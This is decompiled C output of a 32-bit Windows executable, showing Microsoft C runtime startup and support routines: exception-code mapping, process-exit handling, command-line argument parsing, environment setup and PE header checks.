// Address range: 0x4095e6 - 0x4095f8
int32_t function_4095e6(int32_t a1) {
    // 0x4095e6
    return function_409478(a1);
}

// Address range: 0x4095f8 - 0x409683
int32_t function_4095f8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = function_40bab7(); // 0x409609
    if (v1 != 0) {
        // 0x409612
        if (*(int32_t *)(v1 + 860) != 0) {
            // 0x40962b
            function_4065bf();
            return function_4065ae();
        }
    }
    int32_t v2 = g185 ^ g112; // 0x409655
    uint32_t v3 = g112 & 31; // 0x40965b
    int32_t v4 = v2; // 0x409661
    if (v3 != 0) {
        v4 = v2 >> v3 | v2 << 32 - v3;
    }
    if (v4 != 0) {
        // 0x40962b
        function_4065bf();
        return function_4065ae();
    }
    // 0x40966d
    function_4096a0();
    __asm_int3();
    return function_4095f8(0, 0, 0, 0, 0);
}

// Address range: 0x409683 - 0x4096a0
int32_t function_409683(void) {
    // 0x409683
    function_4095f8(0, 0, 0, 0, 0);
    function_4096a0();
    return __asm_int3();
}

// Address range: 0x4096a0 - 0x4096d3
int32_t function_4096a0(void) {
    // 0x4096a0
    if (IsProcessorFeaturePresent(23)) {
        // 0x4096ab
        __asm_int(41);
    }
    // 0x4096b0
    int32_t v1; // 0x4096a0
    function_4094a9(2, -0x3ffffbe9, 1, v1);
    return TerminateProcess(GetCurrentProcess(), (int32_t)&g266);
}

// Address range: 0x4096d3 - 0x4096de
int32_t function_4096d3(void) {
    // 0x4096d3
    return function_40bc16((int32_t)&g266);
}

// Address range: 0x4096de - 0x4096df
int32_t function_4096de(int32_t a1) {
    // 0x4096de
    int32_t result; // 0x4096de
    return result;
}

// Address range: 0x4096e0 - 0x4096f2
int32_t function_4096e0(int32_t a1) {
    // 0x4096e0
    return function_409478(a1);
}

// Address range: 0x4096f2 - 0x409736
int32_t function_4096f2(int32_t a1) {
    // 0x4096f2
    int32_t v1; // bp-4, 0x4096f2
    int32_t v2; // 0x4096f2
    int32_t v3; // 0x4096f2
    if (function_409736(v2, g112 ^ (int32_t)&v1, v3) != 0) {
        // 0x40970e
        function_4065bf();
    }
    // 0x409727
    return function_4065ae();
}

// Address range: 0x409736 - 0x40977c
int32_t function_409736(int32_t a1, int32_t a2, int32_t a3) {
    // 0x409736
    function_406770(&g87, 12, (int32_t)&g266);
    int32_t v1; // 0x409736
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x409742
    *v2 = 0;
    function_40bfa7(0);
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40974e
    *v3 = 0;
    uint32_t v4 = g112 & 31; // 0x40975a
    int32_t v5 = g186 ^ g112; // 0x40975d
    int32_t v6 = v5; // 0x409763
    if (v4 != 0) {
        v6 = v5 >> v4 | v5 << 32 - v4;
    }
    *v2 = v6;
    *v3 = -2;
    function_40977f();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x409776
    return result;
}

// Address range: 0x40977f - 0x409788
int32_t function_40977f(void) {
    // 0x40977f
    return function_40bfef(0);
}

// Address range: 0x409788 - 0x4098fb
int32_t function_409788(int32_t a1, int32_t a2) {
    int32_t v1 = function_40bab7(); // 0x40979a
    if (v1 == 0) {
        // 0x4098ec
        return function_4065ae();
    }
    int32_t v2 = *(int32_t *)v1; // 0x4097a9
    int32_t v3 = v2 + 132;
    int32_t v4 = v2;
    int32_t * v5 = (int32_t *)v4;
    while (*v5 != a1) {
        // 0x4097c2
        if (v4 == v3) {
            // 0x4098ec
            return function_4065ae();
        }
        v4 += 12;
        v5 = (int32_t *)v4;
    }
    if (v4 == 0) {
        // 0x4098ec
        return function_4065ae();
    }
    int32_t * v6 = (int32_t *)(v4 + 8); // 0x4097cf
    int32_t v7 = *v6; // 0x4097cf
    if (v7 == 0) {
        // 0x4098ec
        return function_4065ae();
    }
    if (v7 == 5) {
        // 0x4097e2
        *v6 = 0;
        // 0x4098ec
        return function_4065ae();
    }
    if (v7 == 1) {
        // 0x4098ec
        return function_4065ae();
    }
    int32_t * v8 = (int32_t *)(v1 + 4); // 0x4097f6
    int32_t v9 = *v8; // 0x4097f6
    *v8 = a2;
    if (*(int32_t *)(v4 + 4) != 8) {
        // 0x4098d0
        *v6 = 0;
        function_4065bf();
        // 0x4098e0
        *v8 = v9;
        // 0x4098ec
        return function_4065ae();
    }
    int32_t v10 = v2 + 36;
    *(int32_t *)(v10 + 8) = 0;
    while (v10 != v3) {
        // 0x409814
        v10 += 12;
        *(int32_t *)(v10 + 8) = 0;
    }
    int32_t * v11 = (int32_t *)(v1 + 8); // 0x40981e
    uint32_t v12 = *v5; // 0x409826
    if (v12 < 0xc0000092) {
        switch (v12) {
            case -0x3fffff6f: {
                // 0x409870
                *v11 = 132;
                // break -> 0x4098bb
                break;
            }
            case -0x3fffff73: {
                // 0x409867
                *v11 = 130;
                // break -> 0x4098bb
                break;
            }
            case -0x3fffff72: {
                // 0x40985e
                *v11 = 131;
                // break -> 0x4098bb
                break;
            }
            case -0x3fffff71: {
                // 0x409855
                *v11 = 134;
                // break -> 0x4098bb
                break;
            }
            default: {
                if (v12 == -0x3fffff70) {
                    // 0x40984c
                    *v11 = 129;
                }
                // break -> 0x4098bb
                break;
            }
        }
    } else {
        switch (v12) {
            case -0x3fffff6e: {
                // 0x4098b4
                *v11 = 138;
                // break -> 0x4098bb
                break;
            }
            case -0x3fffff6d: {
                // 0x4098ab
                *v11 = 133;
                // break -> 0x4098bb
                break;
            }
            case -0x3ffffd4c: {
                // 0x4098a2
                *v11 = 142;
                // break -> 0x4098bb
                break;
            }
            default: {
                if (v12 == -0x3ffffd4b) {
                    // 0x409899
                    *v11 = 141;
                }
                // break -> 0x4098bb
                break;
            }
        }
    }
    // 0x4098bb
    function_4065bf();
    // 0x4098e0
    *v8 = v9;
    // 0x4098ec
    return function_4065ae();
}

// Address range: 0x4098fb - 0x40991a
int32_t function_4098fb(uint32_t a1) {
    uint32_t v1 = -g112 & 31; // 0x409910
    int32_t v2 = a1; // 0x409910
    if (v1 != 0) {
        v2 = a1 << 32 - v1 | a1 >> v1;
    }
    return v2 ^ g112;
}

// Address range: 0x40991a - 0x40992d
int32_t function_40991a(int32_t a1) {
    // 0x40991a
    return (bool)(a1 == -0x1f928c9d);
}

// Address range: 0x40992d - 0x409a1c
int32_t function_40992d(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = &g88; // bp-8, 0x40992f
    function_4113c0(&g88, 12, (int32_t)&g266);
    int32_t v2; // 0x40992d
    int32_t v3 = *(int32_t *)(v2 + 16); // 0x409939
    int32_t v4; // bp-12, 0x40992d
    if (v3 == 0) {
        // 0x409940
        if ((char)function_409a87() != 0) {
            int32_t v5 = *(int32_t *)(v2 + 8); // 0x409949
            v4 = v5;
            function_409acb(v5);
        }
    }
    // 0x409952
    v4 = 2;
    function_40bfa7(2);
    int32_t v6 = &v1; // 0x409959
    int32_t * v7 = (int32_t *)(v2 - 4); // 0x40995a
    *v7 = 0;
    int32_t v8; // 0x40992d
    if (g189 != 0) {
        // 0x409a04
        *v7 = -2;
        function_409a37();
        v8 = v6;
        if (v3 == 0) {
            // 0x409a14
            *(int32_t *)(v6 - 4) = *(int32_t *)(v2 + 8);
            function_409a46((int32_t)&g266);
            // UNREACHABLE
        }
    } else {
        // 0x40996b
        g187 = 1;
        *v7 = 1;
        int32_t v9 = *(int32_t *)(v2 + 12); // 0x40997c
        int32_t v10; // 0x40992d
        if (v9 != 0) {
            if (v9 != 1) {
                // 0x4099cf
                *v7 = 0;
                v10 = v6;
            } else {
                // 0x4099cf
                v4 = &g195;
                function_40a433();
                *v7 = 0;
                v10 = (int32_t)&v4 + 4;
            }
        } else {
            // 0x409983
            v4 = 32;
            int32_t v11 = v6; // 0x4099a1
            if (g188 != g112) {
                // 0x4099a3
                v4 = 0;
                int32_t v12 = 0; // bp-20, 0x4099a9
                function_4065bf();
                v11 = &v12;
            }
            int32_t * v13 = (int32_t *)(v11 - 4);
            *v13 = (int32_t)&g194;
            function_40a433();
            *v7 = 0;
            *v13 = (int32_t)&g9;
            *(int32_t *)(v11 - 8) = (int32_t)&g8;
            function_40a6b9(&g266, &g266);
            v10 = v11;
        }
        // 0x4099e8
        *(int32_t *)(v10 - 4) = (int32_t)&g11;
        *(int32_t *)(v10 - 8) = (int32_t)&g10;
        function_40a6b9(&g266, &g266);
        if (v3 == 0) {
            // 0x409a04
            g189 = 1;
            *v7 = -2;
            function_409a37();
            // 0x409a14
            *(int32_t *)(v10 - 4) = *(int32_t *)(v2 + 8);
            function_409a46((int32_t)&g266);
            // UNREACHABLE
        }
        // 0x409a04
        *v7 = -2;
        function_409a37();
        v8 = v10;
    }
    function_409a40();
    // 0x409a14
    *(int32_t *)(v8 - 4) = *(int32_t *)(v2 + 8);
    function_409a46((int32_t)&g266);
    // UNREACHABLE
}

// Address range: 0x409a1c - 0x409a2c
int32_t function_409a1c(void) {
    // 0x409a1c
    int32_t v1; // 0x409a1c
    return function_40991a(*(int32_t *)*(int32_t *)*(int32_t *)(v1 - 20));
}

// Address range: 0x409a37 - 0x409a40
int32_t function_409a37(void) {
    // 0x409a37
    return function_40bfef(2);
}

// Address range: 0x409a40 - 0x409a46
int32_t function_409a40(void) {
    // 0x409a40
    return function_411409();
}

// Address range: 0x409a46 - 0x409a86
int32_t function_409a46(int32_t a1) {
    // 0x409a46
    int32_t v1; // bp-4, 0x409a46
    int32_t v2 = &v1; // 0x409a48
    int32_t v3 = v2; // 0x409a52
    int32_t v4; // 0x409a46
    if ((char)function_40c3e4(v4) != 0) {
        int32_t v5 = *(int32_t *)(__readfsdword(48) + 104); // 0x409a5a
        v3 = v2;
        if ((v5 & 256) == 0) {
            int32_t * processHandle = GetCurrentProcess(); // 0x409a67
            int32_t v6 = (int32_t)processHandle; // bp-12, 0x409a6d
            TerminateProcess(processHandle, (int32_t)&g266);
            v3 = &v6;
        }
    }
    int32_t * v7 = (int32_t *)(v3 - 4); // 0x409a74
    *v7 = a1;
    function_409acb((int32_t)&g266);
    *v7 = a1;
    ExitProcess((int32_t)&g266);
    // UNREACHABLE
}

// Address range: 0x409a87 - 0x409acb
int32_t function_409a87(void) {
    int32_t * v1 = GetModuleHandleW(NULL); // 0x409a89
    int32_t v2 = (int32_t)v1; // 0x409a89
    if (v1 == NULL) {
        // 0x409a95
        return v2 & -256;
    }
    // 0x409a98
    if (*(int16_t *)v1 != 0x5a4d) {
        // 0x409a95
        return 0x5a00;
    }
    int32_t v3 = *(int32_t *)(v2 + 60) + v2; // 0x409aa5
    if (*(int32_t *)v3 != 0x4550 || *(int16_t *)(v3 + 24) != 267 || *(int32_t *)(v3 + 116) < 15) {
        // 0x409a95
        return v3 & -256;
    }
    // 0x409ac0
    return v3 & -256 | (int32_t)(*(int32_t *)(v3 + 232) != 0);
}

// Address range: 0x409acb - 0x409b35
int32_t function_409acb(int32_t a1) {
    int32_t phModule = 0; // bp-12, 0x409adc
    int32_t v1 = 0; // bp-24, 0x409ae9
    bool v2 = GetModuleHandleExW(0, L"mscoree.dll", (int32_t **)&phModule); // 0x409aeb
    int32_t v3 = &v1; // 0x409af3
    if (v2) {
        int32_t v4 = phModule; // bp-36, 0x409afb
        int32_t (*func)() = GetProcAddress((int32_t *)phModule, "CorExitProcess"); // 0x409afe
        int32_t * v5 = &v4; // 0x409b08
        if (func != NULL) {
            int32_t v6 = a1; // bp-40, 0x409b0a
            function_4065bf();
            v5 = &v6;
        }
        // 0x409b17
        v3 = (int32_t)v5 + 4;
    }
    // 0x409b18
    if (phModule != 0) {
        // 0x409b1e
        *(int32_t *)(v3 - 4) = phModule;
        FreeLibrary(&g266);
    }
    // 0x409b27
    return function_4065ae();
}

// Address range: 0x409b35 - 0x409b36
int32_t function_409b35(int32_t a1) {
    // 0x409b35
    int32_t result; // 0x409b35
    return result;
}

// Address range: 0x409b37 - 0x409b44
int32_t function_409b37(int32_t result) {
    // 0x409b37
    g188 = result;
    return result;
}

// Address range: 0x409b44 - 0x409b4f
int32_t function_409b44(void) {
    // 0x409b44
    function_40992d(0, 2, 1);
    // UNREACHABLE
}

// Address range: 0x409b4f - 0x409b53
int32_t function_409b4f(void) {
    // 0x409b4f
    int32_t result; // 0x409b4f
    return result;
}

// Address range: 0x409b53 - 0x409b5e
int32_t function_409b53(void) {
    // 0x409b53
    function_40992d(0, 0, 1);
    // UNREACHABLE
}

// Address range: 0x409b5e - 0x409b62
int32_t function_409b5e(void) {
    // 0x409b5e
    int32_t result; // 0x409b5e
    return result;
}

// Address range: 0x409b62 - 0x409b73
int32_t function_409b62(int32_t a1) {
    // 0x409b62
    function_40992d(a1, 2, 0);
    // UNREACHABLE
}

// Address range: 0x409b73 - 0x409b78
int32_t function_409b73(int32_t a1) {
    // 0x409b73
    int32_t result; // 0x409b73
    return result;
}

// Address range: 0x409b78 - 0x409bb0
int32_t function_409b78(int32_t a1) {
    // 0x409b78
    if (g188 != g112) {
        function_40a896();
        // UNREACHABLE
    }
    int32_t result = function_4098fb(a1); // 0x409ba3
    g188 = result;
    return result;
}

// Address range: 0x409bb0 - 0x409bc1
int32_t function_409bb0(int32_t a1) {
    // 0x409bb0
    function_40992d(a1, 0, 0);
    // UNREACHABLE
}

// Address range: 0x409bc1 - 0x409bc6
int32_t function_409bc1(int32_t a1) {
    // 0x409bc1
    int32_t result; // 0x409bc1
    return result;
}

// Address range: 0x409bc6 - 0x409cea
int32_t function_409bc6(int32_t a1) {
    if ((uint32_t)(a1 - 1) >= 2) {
        // 0x409bdb
        *(int32_t *)function_40ab11() = 22;
        // 0x409ce5
        return 22;
    }
    // 0x409bf1
    function_40ce86();
    GetModuleFileNameA(NULL, (char *)&g190, 260);
    g226 = (char *)&g190;
    int32_t v1; // 0x409bc6
    if (g224 == NULL) {
        // 0x409c21
        v1 = (int32_t)&g190;
        goto lab_0x409c23;
    } else {
        // 0x409c1c
        v1 = (int32_t)g224;
        if (*g224 != 0) {
            goto lab_0x409c23;
        } else {
            // 0x409c21
            v1 = (int32_t)&g190;
            goto lab_0x409c23;
        }
    }
  lab_0x409c23:;
    int32_t v2 = 0; // bp-8, 0x409c26
    int32_t v3 = 0; // bp-16, 0x409c2d
    function_409cea(v1, 0, 0, &v2, &v3);
    int32_t v4 = function_409e5f(v2, v3, 1); // 0x409c41
    int32_t result; // 0x409bc6
    int32_t v5; // 0x409bc6
    if (v4 != 0) {
        // 0x409c5b
        function_409cea(v1, v4, 4 * v2 + v4, &v2, &v3);
        if (a1 != 1) {
            int32_t v6 = 0; // bp-12, 0x409c93
            int32_t v7 = function_40c9a1(v4, &v6); // 0x409c98
            int32_t v8 = v6;
            int32_t v9 = v8; // 0x409ca3
            int32_t v10 = v7; // 0x409ca3
            if (v7 == 0) {
                int32_t v11 = 0; // 0x409cb3
                if (*(int32_t *)v8 != 0) {
                    int32_t v12 = v8 + 4; // 0x409cb5
                    int32_t v13 = 1; // 0x409cb8
                    int32_t v14 = v12; // 0x409cbb
                    int32_t v15 = v13; // 0x409cbb
                    v11 = v13;
                    while (*(int32_t *)v12 != 0) {
                        // 0x409cb5
                        v12 = v14 + 4;
                        v13 = v15 + 1;
                        v14 = v12;
                        v15 = v13;
                        v11 = v13;
                    }
                }
                // 0x409cbd
                g221 = v11;
                v6 = 0;
                g222 = v8;
                v9 = 0;
                v10 = 0;
            }
            // 0x409cd0
            function_40bbdc(v9);
            v6 = 0;
            result = v10;
            v5 = v4;
        } else {
            // 0x409c7a
            g221 = v2 - 1;
            g222 = v4;
            result = 0;
            v5 = 0;
        }
    } else {
        // 0x409c4f
        *(int32_t *)function_40ab11() = 12;
        result = 12;
        v5 = v4;
    }
    // 0x409cda
    function_40bbdc(v5);
    // 0x409ce5
    return result;
}

// Address range: 0x409cea - 0x409e5f
int32_t function_409cea(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5) {
    // 0x409cea
    *a5 = 0;
    *a4 = 1;
    int32_t v1 = 0; // 0x409d0d
    if (a2 != 0) {
        // 0x409d0f
        *(int32_t *)a2 = a3;
        v1 = a2 + 4;
    }
    // 0x409d17
    int32_t v2; // bp-20, 0x409cea
    int32_t * v3 = (int32_t *)((int32_t)&v2 - 4);
    char v4 = 0; // 0x409d19
    int32_t v5 = 0; // 0x409d19
    int32_t v6 = a1; // 0x409d19
    int32_t v7 = a3; // 0x409d19
    int32_t v8; // 0x409cea
    int32_t v9; // 0x409cea
    int32_t v10; // 0x409cea
    int32_t v11; // 0x409cea
    while (true) {
        int32_t v12 = v7;
        int32_t v13 = v6;
        char * v14 = (char *)v13; // 0x409d1c
        char v15; // 0x409cea
        int32_t v16; // 0x409cea
        int32_t v17; // 0x409cea
        int32_t v18; // 0x409cea
        char v19; // 0x409cea
        if (*v14 != 34) {
            // 0x409d2e
            *a5 = *a5 + 1;
            int32_t v20 = 0; // 0x409d32
            if (v12 != 0) {
                // 0x409d34
                *(char *)v12 = *v14;
                v20 = v12 + 1;
            }
            int32_t v21 = v20;
            char v22 = *v14; // 0x409d39
            int32_t v23 = v13 + 1; // 0x409d3b
            int32_t v24 = v22; // 0x409d3f
            *v3 = v24;
            int32_t v25 = v23; // 0x409d4b
            int32_t v26 = v21; // 0x409d4b
            if (function_40d211(v24) != 0) {
                // 0x409d4d
                *a5 = *a5 + 1;
                int32_t v27 = 0; // 0x409d51
                if (v21 != 0) {
                    // 0x409d53
                    *(char *)v21 = *(char *)v23;
                    v27 = v21 + 1;
                }
                // 0x409d58
                v25 = v13 + 2;
                v26 = v27;
            }
            // 0x409d59
            v8 = v26;
            v10 = v25;
            if (v22 == 0) {
                // break -> 0x409d79
                break;
            }
            // 0x409d60
            v19 = v4;
            v15 = v22;
            v16 = v4;
            v18 = v10;
            v17 = v8;
        } else {
            // 0x409d21
            v19 = v5 == 0;
            v15 = 34;
            v16 = v5 == 0;
            v18 = v13 + 1;
            v17 = v12;
        }
        // 0x409d63
        v7 = v17;
        v6 = v18;
        if (v16 == 0) {
            char v28 = v15;
            if (v28 != 32 != v28 != 9) {
                // 0x409d6f
                v11 = v6;
                v9 = 0;
                if (v7 == 0) {
                    goto lab_0x409d7a;
                } else {
                    // 0x409d73
                    *(char *)(v7 - 1) = 0;
                    v11 = v6;
                    v9 = v7;
                    goto lab_0x409d7a;
                }
            }
        }
        // 0x409d1c
        v4 = v19;
        v5 = v16;
    }
    // 0x409d79
    v11 = v10 - 1;
    v9 = v8;
    goto lab_0x409d7a;
  lab_0x409df5:;
    // 0x409df5
    int32_t v64; // 0x409cea
    int32_t v73 = v64;
    int32_t v63; // 0x409cea
    int32_t v75 = v63;
    char v61; // 0x409cea
    char v74 = v61;
    int32_t v48; // 0x409cea
    int32_t v76 = v48; // 0x409df7
    int32_t v62; // 0x409cea
    int32_t v77 = v62; // 0x409df7
    int32_t v78 = v48; // 0x409df7
    if (v62 != 0) {
        int32_t v79 = v76;
        int32_t v80 = 0; // 0x409ded
        if (v79 != 0) {
            // 0x409def
            *(char *)v79 = 92;
            v80 = v79 + 1;
        }
        int32_t v81 = v77 - 1; // 0x409dea
        *a5 = *a5 + 1;
        v77 = v81;
        v78 = v80;
        while (v81 != 0) {
            // 0x409dea
            v79 = v80;
            v80 = 0;
            if (v79 != 0) {
                // 0x409def
                *(char *)v79 = 92;
                v80 = v79 + 1;
            }
            // 0x409df3
            v81 = v77 - 1;
            *a5 = *a5 + 1;
            v77 = v81;
            v78 = v80;
        }
    }
    int32_t v70 = v78;
    char * v72 = (char *)v73;
    char v82 = *v72; // 0x409df9
    if (v82 == 0) {
        // break -> 0x409e3a
        goto lab_0x409e3a_2;
    }
    if (v74 != 0) {
        goto lab_0x409e0d;
    } else {
        switch (v82) {
            case 32: {
                goto lab_0x409e3a_2;
            }
            case 9: {
                goto lab_0x409e3a_2;
            }
            default: {
                goto lab_0x409e0d;
            }
        }
    }
  lab_0x409e0d:;
    int32_t v83 = v73; // 0x409e0f
    int32_t v84 = v70; // 0x409e0f
    if (v75 != 0) {
        char v85 = v82; // 0x409e13
        int32_t v86 = 0; // 0x409e13
        if (v70 != 0) {
            // 0x409e15
            *(char *)v70 = v82;
            v85 = *v72;
            v86 = v70 + 1;
        }
        int32_t v87 = v86;
        *v3 = (int32_t)v85;
        int32_t v88 = function_40d211((int32_t)&g266); // 0x409e1c
        int32_t v89 = v73; // 0x409e24
        int32_t v90 = v87; // 0x409e24
        if (v88 != 0) {
            int32_t v91 = v73 + 1; // 0x409e26
            *a5 = *a5 + 1;
            v89 = v91;
            v90 = 0;
            if (v87 != 0) {
                // 0x409e2d
                *(char *)v87 = *(char *)v91;
                v89 = v91;
                v90 = v87 + 1;
            }
        }
        // 0x409e32
        *a5 = *a5 + 1;
        v83 = v89;
        v84 = v90;
    }
    char v45 = v74; // 0x409e35
    int32_t v46 = v83 + 1; // 0x409e35
    int32_t v47 = v84; // 0x409e35
    goto lab_0x409db1;
  lab_0x409de6:;
    // 0x409de6
    char v65; // 0x409cea
    v61 = v65;
    int32_t v59; // 0x409cea
    v62 = v59 / 2;
    int32_t v66; // 0x409cea
    v63 = v66;
    int32_t v67; // 0x409cea
    v64 = v67;
    goto lab_0x409df5;
  lab_0x409dde:;
    // 0x409dde
    char v49; // 0x409cea
    v65 = v49 == 0;
    v66 = 0;
    int32_t v60; // 0x409cea
    v67 = v60;
    goto lab_0x409de6;
  lab_0x409d7a:;
    char v29 = *(char *)v11; // 0x409d7e
    char v30 = v29; // 0x409d81
    int32_t v31 = v9; // 0x409d81
    int32_t v32 = v11; // 0x409d81
    char v33 = 0; // 0x409d81
    int32_t v34 = v1; // 0x409d81
    int32_t v35 = v1; // 0x409d81
    if (v29 != 0) {
        while (true) {
            int32_t v36 = v34;
            int32_t v37 = v31;
            char v38 = v30; // 0x409d87
            int32_t v39 = v32; // 0x409d8b
            int32_t v40 = v32; // 0x409d8b
            if (v38 != 32 != v38 != 9) {
                int32_t v41 = v39 + 1; // 0x409d91
                char v42 = *(char *)v41; // 0x409d87
                v39 = v41;
                while (v42 != 32 != v42 != 9) {
                    // 0x409d91
                    v41 = v39 + 1;
                    v42 = *(char *)v41;
                    v39 = v41;
                }
                // 0x409d94
                v40 = v41;
                v35 = v36;
                if (v42 == 0) {
                    // break -> 0x409e49
                    break;
                }
            }
            int32_t v43 = 0; // 0x409da2
            if (v36 != 0) {
                // 0x409da4
                *(int32_t *)v36 = v37;
                v43 = v36 + 4;
            }
            int32_t v44 = v43;
            *a4 = *a4 + 1;
            v45 = v33;
            v46 = v40;
            v47 = v37;
            while (true) {
              lab_0x409db1:
                // 0x409db1
                v48 = v47;
                v49 = v45;
                char v50 = *(char *)v46; // 0x409dba
                int32_t v51 = v46; // 0x409dbd
                int32_t v52 = v46; // 0x409dbd
                int32_t v53 = 0; // 0x409dbd
                char v54 = v50; // 0x409dbd
                if (v50 == 92) {
                    int32_t v55 = v51 + 1; // 0x409db8
                    int32_t v56 = 1; // 0x409db9
                    char v57 = *(char *)v55; // 0x409dba
                    int32_t v58 = v56; // 0x409dbd
                    v51 = v55;
                    v52 = v55;
                    v53 = v56;
                    v54 = v57;
                    while (v57 == 92) {
                        // 0x409db8
                        v55 = v51 + 1;
                        v56 = v58 + 1;
                        v57 = *(char *)v55;
                        v58 = v56;
                        v51 = v55;
                        v52 = v55;
                        v53 = v56;
                        v54 = v57;
                    }
                }
                // 0x409dbf
                v59 = v53;
                v60 = v52;
                v61 = v49;
                v62 = v59;
                v63 = 1;
                v64 = v60;
                if (v54 != 34) {
                    goto lab_0x409df5;
                } else {
                    // 0x409dc4
                    v65 = v49;
                    v66 = 1;
                    v67 = v60;
                    if ((v59 & 1) != 0) {
                        goto lab_0x409de6;
                    } else {
                        if (v49 == 0) {
                            goto lab_0x409dde;
                        } else {
                            int32_t v68 = v60 + 1; // 0x409dcf
                            v65 = v49;
                            v66 = 1;
                            v67 = v68;
                            if (*(char *)v68 != 34) {
                                goto lab_0x409dde;
                            } else {
                                goto lab_0x409de6;
                            }
                        }
                    }
                }
            }
          lab_0x409e3a_2:;
            int32_t v69 = 0; // 0x409e3c
            if (v70 != 0) {
                // 0x409e3e
                *(char *)v70 = 0;
                v69 = v70 + 1;
            }
            // 0x409e42
            *a5 = *a5 + 1;
            char v71 = *v72; // 0x409d7e
            v30 = v71;
            v31 = v69;
            v32 = v73;
            v33 = v74;
            v34 = v44;
            v35 = v44;
            if (v71 == 0) {
                // break -> 0x409e49
                break;
            }
        }
    }
    // 0x409e49
    if (v35 != 0) {
        // 0x409e53
        *(int32_t *)v35 = 0;
    }
    // 0x409e56
    *a4 = *a4 + 1;
    return (int32_t)a4;
}

// Address range: 0x409e5f - 0x409eb4
int32_t function_409e5f(uint32_t a1, uint32_t a2, uint32_t a3) {
    // 0x409e5f
    if (a1 >= 0x3fffffff || 0xffffffff / a3 <= a2) {
        // 0x409eb1
        return 0;
    }
    uint32_t v1 = a3 * a2; // 0x409e86
    int32_t v2 = 4 * a1; // 0x409e8a
    int32_t result = 0; // 0x409e91
    if (v1 < (v2 ^ -1)) {
        // 0x409e97
        result = function_40c4a1(v1 + v2, 1);
        function_40bbdc(0);
    }
    // 0x409eb1
    return result;
}

// Address range: 0x409eb4 - 0x409ebf
int32_t function_409eb4(int32_t a1) {
    // 0x409eb4
    return function_409bc6((int32_t)&g266);
}

// Address range: 0x409ebf - 0x409f18
int32_t function_409ebf(void) {
    // 0x409ebf
    if (g191 != 0) {
        // 0x409ec8
        return 0;
    }
    // 0x409ecb
    int32_t v1; // bp-8, 0x409ebf
    int32_t v2 = &v1; // 0x409ecc
    function_40ce86();
    int32_t v3 = function_40d279(); // 0x409ed2
    if (v3 == 0) {
        // 0x409f0c
        *(int32_t *)(v2 - 4) = v3;
        function_40bbdc((int32_t)&g266);
        return -1;
    }
    int32_t v4 = v3; // bp-12, 0x409ee2
    int32_t v5 = function_409f18(v3); // 0x409ee3
    int32_t v6 = v2; // 0x409eeb
    int32_t result = -1; // 0x409eeb
    if (v5 != 0) {
        // 0x409ef2
        v4 = v5;
        g193 = v5;
        function_409478(v5);
        v6 = &v4;
        result = 0;
    }
    int32_t * v7 = (int32_t *)(v6 - 4);
    *v7 = 0;
    function_40bbdc((int32_t)&g266);
    // 0x409f0c
    *v7 = v3;
    function_40bbdc((int32_t)&g266);
    return result;
}

// Address range: 0x409f18 - 0x409fe9
int32_t function_409f18(int32_t a1) {
    char * v1 = (char *)a1;
    char v2 = *v1; // 0x409f29
    int32_t v3 = a1; // 0x409f47
    int32_t v4 = 0; // 0x409f47
    int32_t v5 = 1; // 0x409f47
    if (v2 != 0) {
        while (*(char *)v3 != 0) {
            // 0x409f37
            v3++;
        }
        // 0x409f3e
        v4 += (int32_t)(v2 != 61);
        char v6 = *(char *)v3; // 0x409f43
        while (v6 != 0) {
            // 0x409f2d
            while (*(char *)v3 != 0) {
                // 0x409f37
                v3++;
            }
            // 0x409f3e
            v4 += (int32_t)(v6 != 61);
            v6 = *(char *)v3;
        }
        // 0x409f45
        v5 = v4 + 1;
    }
    int32_t result = function_40c4a1(v5, 4); // 0x409f4f
    int32_t v7; // bp-24, 0x409f18
    int32_t v8 = &v7; // 0x409f57
    if (result == 0) {
        // 0x409fcb
        *(int32_t *)(v8 - 4) = 0;
        function_40bbdc((int32_t)&g266);
        return 0;
    }
    char v9 = *v1; // 0x409fb3
    if (v9 == 0) {
        // 0x409fcb
        *(int32_t *)(v8 - 4) = 0;
        function_40bbdc((int32_t)&g266);
        return result;
    }
    int32_t * v10 = (int32_t *)(v8 - 4);
    int32_t * v11 = (int32_t *)(v8 - 8);
    int32_t * v12 = (int32_t *)(v8 - 12);
    int32_t v13 = a1;
    int32_t v14 = v13 + 1; // 0x409f68
    while (*(char *)v13 != 0) {
        // 0x409f66
        v13 = v14;
        v14 = v13 + 1;
    }
    int32_t v15 = result; // 0x409f78
    int32_t result2; // 0x409f18
    int32_t v16; // 0x409f72
    int32_t v17; // 0x409f7d
    int32_t v18; // 0x409f8f
    if (v9 != 61) {
        // 0x409f7a
        v16 = v13 - a1 + 1;
        *v10 = 1;
        *v11 = v16;
        v17 = function_40c4a1(v16, (int32_t)&g266);
        if (v17 == 0) {
            // 0x409fba
            *v10 = result;
            function_409fe9((int32_t)&g266);
            *v11 = 0;
            function_40bbdc((int32_t)&g266);
            result2 = 0;
            goto lab_0x409fcb;
        }
        // 0x409f8a
        *v10 = a1;
        *v11 = v16;
        *v12 = v17;
        v18 = function_40a931((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        *v10 = 0;
        if (v18 != 0) {
            // 0x409fdc
            *v11 = 0;
            *v12 = 0;
            *(int32_t *)(v8 - 16) = 0;
            *(int32_t *)(v8 - 20) = 0;
            function_4096a0();
            return __asm_int3();
        }
        // 0x409f9b
        *(int32_t *)result = v17;
        v15 = result + 4;
        function_40bbdc(v15);
    }
    char v19 = *(char *)v14; // 0x409fb3
    result2 = result;
    while (v19 != 0) {
        int32_t v20 = v15;
        int32_t v21 = v14;
        v13 = v21;
        v14 = v13 + 1;
        while (*(char *)v13 != 0) {
            // 0x409f66
            v13 = v14;
            v14 = v13 + 1;
        }
        // 0x409f6d
        v15 = v20;
        if (v19 != 61) {
            // 0x409f7a
            v16 = v13 - v21 + 1;
            *v10 = 1;
            *v11 = v16;
            v17 = function_40c4a1(v16, (int32_t)&g266);
            if (v17 == 0) {
                // 0x409fba
                *v10 = result;
                function_409fe9((int32_t)&g266);
                *v11 = 0;
                function_40bbdc((int32_t)&g266);
                result2 = 0;
                goto lab_0x409fcb;
            }
            // 0x409f8a
            *v10 = v21;
            *v11 = v16;
            *v12 = v17;
            v18 = function_40a931((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
